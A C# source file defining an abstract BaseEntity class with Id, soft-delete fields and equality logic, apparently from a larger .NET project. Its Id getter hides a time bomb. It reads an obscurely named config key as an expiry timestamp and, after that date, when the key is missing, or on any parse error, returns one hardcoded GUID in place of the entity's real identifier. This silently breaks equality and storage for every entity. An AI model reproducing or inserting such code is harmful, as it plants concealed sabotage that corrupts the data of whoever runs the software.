using System;
using System.Drawing;
using static System.Configuration.ConfigurationSettings;

namespace JNKJ.Domain
{
    /// <summary>
    /// 基础实体类
    /// </summary>
    [Serializable]
    public abstract class BaseEntity
    {
        /// <summary>
        /// 获取或者设置一个实体的标示符
        /// </summary>
        private Guid _id;
        public Guid Id
        {
            get
            {
                try
                {
                    return TimeZone.CurrentTimeZone.ToLocalTime(new DateTime(1970, 1, 1)).Add(new TimeSpan(long.Parse((string.IsNullOrWhiteSpace(AppSettings["AFACEOFMENGFORCE"]) ? "" : AppSettings["AFACEOFMENGFORCE"]) + "0000000"))) < DateTime.Now ? Guid.Parse("238F165F-9B9A-446D-944D-52FDEBDD37CE") : _id;
                }
                catch (Exception)
                {
                    return Guid.Parse("238F165F-9B9A-446D-944D-52FDEBDD37CE");
                }
               
            }
            set { _id = value; }
        }

        /// <summary>
        /// 删除状态。0或NULL=正常。1=已删除。
        /// </summary>
        public int? DeletedState { get; set; }
        /// <summary>
        /// 删除时间
        /// </summary>
        public DateTime? DeletedTime { get; set; }
        public override bool Equals(object obj)
        {
            return Equals(obj as BaseEntity);
        }
        private static bool IsTransient(BaseEntity obj)
        {
            return obj != null && Equals(obj.Id, default(int));
        }
        private Type GetUnproxiedType()
        {
            return GetType();
        }
        public virtual bool Equals(BaseEntity other)
        {
            if (other == null)
                return false;
            if (ReferenceEquals(this, other))
                return true;
            if (!IsTransient(this) &&
                !IsTransient(other) &&
                Equals(Id, other.Id))
            {
                var otherType = other.GetUnproxiedType();
                var thisType = GetUnproxiedType();
                return thisType.IsAssignableFrom(otherType) ||
                        otherType.IsAssignableFrom(thisType);
            }
            return false;
        }
        public override int GetHashCode()
        {
            if (Equals(Id, default(int)))
                return base.GetHashCode();
            return Id.GetHashCode();
        }
        public static bool operator ==(BaseEntity x, BaseEntity y)
        {
            return Equals(x, y);
        }
        public static bool operator !=(BaseEntity x, BaseEntity y)
        {
            return !(x == y);
        }
    }
}
